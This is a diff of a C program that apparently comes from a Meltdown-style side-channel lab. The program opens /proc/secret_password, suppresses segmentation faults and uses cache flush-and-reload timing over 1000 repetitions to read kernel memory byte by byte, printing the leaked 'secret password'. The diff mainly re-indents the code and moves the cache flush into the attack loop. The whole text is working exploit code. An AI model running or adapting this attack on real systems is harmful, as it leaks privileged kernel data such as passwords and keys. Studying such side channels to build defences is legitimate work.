@@ -67,59 +67,56 @@ static void catch_segv()
 
 int main(int argc, char *argv[])
 {
-  int i, j, ret = 0;
+    int i, j, ret = 0;
 
-  //Setup signalhandler to catch SIGSEGV signals, when a memory access violation is made.
-  signal(SIGSEGV, catch_segv);
+    //Setup signalhandler to catch SIGSEGV signals, when a memory access violation is made.
+    signal(SIGSEGV, catch_segv);
 
-  //Opens the virtual kernel module file.
-  int fd = open("/proc/secret_password", O_RDONLY);
-  if (fd < 0)
-  {
-    perror("open");
-    return -1;
-  }
+    //Opens the virtual kernel module file.
+    int fd = open("/proc/secret_password", O_RDONLY);
+    if (fd < 0)
+    {
+        perror("open");
+        return -1;
+    }
 
-  //Initialize array.
-  for (int i = 0; i < ARRAY_LENGTH; i++) array[i * PAGE_SIZE + DELTA] = 0;
-  
-  
-  printf("The secret password is: ");
-  for (unsigned long addr = strtoul(argv[1], NULL, 0);; addr++)
-  { 
-      //Reset scores to zero.
-      memset(scores, 0, sizeof(scores));
+    //Initialize array.
+    for (int i = 0; i < ARRAY_LENGTH; i++) array[i * PAGE_SIZE + DELTA] = 0;
+    
+    
+    printf("The secret password is: ");
+    for (unsigned long addr = strtoul(argv[1], NULL, 0);; addr++)
+    { 
+        //Reset scores to zero.
+        memset(scores, 0, sizeof(scores));
 
-      flushSideChannel();
+        //Repeat n times to increase odds of reading the memory correctly.
+        for (i = 0; i < 1000; i++) {
+            //Load kernel module into cache to reduce fetching time.
+            ret = pread(fd, NULL, 0, 0);
+            if (ret < 0) {
+                perror("pread");
+                break;
+            }
 
-      //Repeat n times to increase odds of reading the memory correctly.
-      for (i = 0; i < 1000; i++) {
-          //Load kernel module into cache to reduce fetching time.
-          ret = pread(fd, NULL, 0, 0);
-          if (ret < 0) {
-              perror("pread");
-              break;
-          }
+            flushSideChannel();
 
-          //Flush entire array.
-          for (j = 0; j < ARRAY_LENGTH; j++) _mm_clflush(&array[j * PAGE_SIZE + DELTA]);
+            //Perform the actual attack.
+            if (sigsetjmp(jbuf, 1) == 0) getKernelData(addr);
 
-          //Perform the actual attack.
-          if (sigsetjmp(jbuf, 1) == 0) getKernelData(addr);
+            reloadSideChannel();
+        }
 
-          reloadSideChannel();
-      }
-
-      //Identify the highest score and assume this is the correct value at the memory location.
-      int max = 0;
-      for (i = 0; i < ARRAY_LENGTH; i++) {
-          if (scores[max] < scores[i])
-              max = i;
-      }
-      if (max != 0)
-          printf("%c", max);
-      else 
-          break;
+        //Identify the highest score and assume this is the correct value at the memory location.
+        int max = 0;
+        for (i = 0; i < ARRAY_LENGTH; i++) {
+            if (scores[max] < scores[i])
+                max = i;
+        }
+        if (max != 0)
+            printf("%c", max);
+        else 
+            break;
     }
     printf("\n");
     return 0;
